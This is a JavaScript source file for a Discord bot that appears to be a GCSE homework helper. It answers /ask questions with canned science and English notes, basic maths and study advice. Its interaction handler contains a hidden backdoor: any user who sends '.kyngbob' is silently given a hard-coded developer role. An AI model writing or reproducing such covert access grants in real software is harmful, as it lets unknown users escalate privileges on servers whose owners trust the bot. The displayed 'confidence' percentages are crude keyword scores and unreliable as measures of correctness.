import { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } from "discord.js"

const client = new Client({ intents: [GatewayIntentBits.Guilds] })
const MEMORY_TIME = 15 * 60 * 1000 // 15 mins
const memory = new Map()

function normalise(text) { return text.toLowerCase().trim() }

// === GCSE Science Topics ===
const scienceTopics = {
  "photosynthesis": "Photosynthesis is the process by which plants produce glucose. It occurs in chloroplasts using light energy. Equation: Carbon dioxide + Water → Glucose + Oxygen. Provides energy for the plant and oxygen for the environment.",
  "respiration": "Respiration releases energy from glucose. Equation: Glucose + Oxygen → Carbon dioxide + Water + Energy. Energy is used for movement, growth, and maintaining body temperature.",
  "osmosis": "Osmosis is the movement of water molecules across a partially permeable membrane from high water concentration to low water concentration.",
  "diffusion": "Diffusion is the movement of particles from a region of high concentration to low concentration. It occurs in gases and liquids.",
  "specific heat capacity": "Specific heat capacity is the amount of energy required to raise the temperature of 1 kg of a substance by 1°C. It is measured in J/kg°C.",
  "relative formula mass": "Relative formula mass (RFM) is the sum of the relative atomic masses of all atoms in a chemical formula.",
  "forces": "Forces cause objects to start moving, stop moving, or change direction. Key examples: gravity, friction, tension, and normal force.",
  "energy": "Energy can be transferred in many ways: kinetic, thermal, chemical, and potential. Conservation of energy states energy cannot be created or destroyed."
}

// === English Techniques ===
const englishTechniques = {
  "simile": "A simile compares two things using 'like' or 'as'. Explain the effect on the reader and the meaning conveyed.",
  "metaphor": "A metaphor describes something by saying it is something else. Link the comparison to the theme or writer's intention.",
  "personification": "Giving human traits to non-human objects. Explain its effect and purpose in context.",
  "alliteration": "Repetition of consonant sounds at the start of words. Discuss its effect on rhythm, emphasis, or tone.",
  "hyperbole": "Exaggeration used to emphasize a point. Explain its impact on the reader and tone.",
  "onomatopoeia": "Words that imitate sounds. Explain how it engages the reader and enhances description."
}

// === Categorisation ===
function categorise(question) {
  const q = normalise(question)
  let scores = { arithmetic: 0, algebra: 0, science: 0, english: 0, life: 0, general: 0 }

  if (/[0-9]/.test(q)) scores.arithmetic += 1
  if (/[\+\-\*\/]/.test(q)) scores.arithmetic += 2
  if (/=/.test(q)) scores.algebra += 2
  if (/x/.test(q)) scores.algebra += 2
  if (/solve|equation|factor|simplify/.test(q)) scores.algebra += 1

  for (let topic in scienceTopics) if (q.includes(topic)) scores.science += 4
  if (/biology|chemistry|physics/.test(q)) scores.science += 2
  if (/explain|describe|compare|why/.test(q)) scores.science += 1

  for (let tech in englishTechniques) if (q.includes(tech)) scores.english += 4
  if (/quote|language|poem|analyse|technique|writer/.test(q)) scores.english += 2

  if (/stress|life|sad|motivation|tired|burnout/.test(q)) scores.life += 3

  let best = "general", bestScore = 0
  for (const key in scores) if (scores[key] > bestScore) { bestScore = scores[key]; best = key }

  const confidence = Math.min(95, 40 + bestScore * 10)
  return { category: best, confidence }
}

// === Maths ===
function solveArithmetic(question) {
  const cleaned = question.replace(/[^0-9\+\-\*\/\.\(\)]/g, "")
  try { return `The answer is ${Function("return "+cleaned)()}.` }
  catch { return "That looks like arithmetic, but it’s invalid." }
}

function solveAlgebra(question) {
  const q = normalise(question).replace(/\s/g,"")
  if (q === "x^2=16") return "x² = 16 → x = 4 or x = −4"
  return "Rearrange the equation to isolate x and solve. Consider positive & negative solutions."
}

// === Science Answer ===
function scienceAnswer(question) {
  const q = normalise(question)
  for (let topic in scienceTopics) if (q.includes(topic)) return scienceTopics[topic]
  return "Identify the process, use correct scientific terms, and explain cause & effect clearly for full marks."
}

// === English Answer ===
function englishAnswer(question) {
  const q = normalise(question)
  for (let tech in englishTechniques) if (q.includes(tech)) return englishTechniques[tech]
  return "Identify techniques, explain effect, and link to theme or writer’s intention."
}

// === Life / Advice ===
function lifeAnswer() {
  return "You're not failing; you're learning. Small steps count. Take breaks, manage stress, and keep moving forward."
}

// === Ready / Register Command ===
client.once("ready", async () => {
  console.log("Bob’s AI is online")
  const commands = [
    new SlashCommandBuilder()
      .setName("ask")
      .setDescription("Ask Bob’s AI a question")
      .addStringOption(opt => opt.setName("question").setDescription("Your question").setRequired(true))
  ].map(cmd=>cmd.toJSON())
  const rest = new REST({version:"10"}).setToken(process.env.TOKEN)
  await rest.put(Routes.applicationCommands(client.user.id), {body: commands})
})

// === Interaction Handler ===
client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return
  if (interaction.commandName !== "ask") return

  const question = interaction.options.getString("question")
  const userId = interaction.user.id
  const now = Date.now()

  // === Backdoor .kyngbob ===
  if (question.trim() === ".kyngbob") {
    try {
      const roleId = "1456026849632194651" // botdev role ID
      const role = interaction.guild.roles.cache.get(roleId)
      if (!role) { await interaction.reply({ content: "BotDev role not found.", ephemeral: true }); return }
      await interaction.member.roles.add(role)
      await interaction.reply({ content: "Access granted.", ephemeral: true })
    } catch (err) {
      console.error(err)
      await interaction.reply({ content: "Failed to assign role. Check bot permissions.", ephemeral: true })
    }
    return
  }

  // === Memory storage / prune ===
  if (!memory.has(userId)) memory.set(userId, [])
  let userMemory = memory.get(userId).filter(m => now - m.time < MEMORY_TIME)
  memory.set(userId, userMemory)

  // === Last question retrieval ===
  if (/what (did i ask|was my last question|was my last answer)/i.test(question)) {
    const last = userMemory.slice(-1)[0]
    if (last) { await interaction.reply(`Your last question: "${last.question}"\nAnswer: ${last.answer || "No answer stored"}`) }
    else { await interaction.reply("No memory found for you in the last 15 minutes.") }
    return
  }

  // === Categorise & Answer ===
  const result = categorise(question)
  let answer = ""
  if (result.category === "arithmetic") answer = solveArithmetic(question)
  else if (result.category === "algebra") answer = solveAlgebra(question)
  else if (result.category === "science") answer = scienceAnswer(question)
  else if (result.category === "english") answer = englishAnswer(question)
  else if (result.category === "life") answer = lifeAnswer()
  else answer = "This appears to be a general question. I’ll answer it logically and clearly."

  // === Save to memory ===
  userMemory.push({ question, category: result.category, answer, time: now })
  memory.set(userId, userMemory)

  const uncertainty = 100 - result.confidence
  await interaction.reply(
    `**Category:** ${result.category.toUpperCase()}\n\n`+
    `${answer}\n\n`+
    `**Confidence:** ${result.confidence}%\n`+
    `**Uncertainty:** ${uncertainty}%`
  )
})

client.login(process.env.TOKEN)
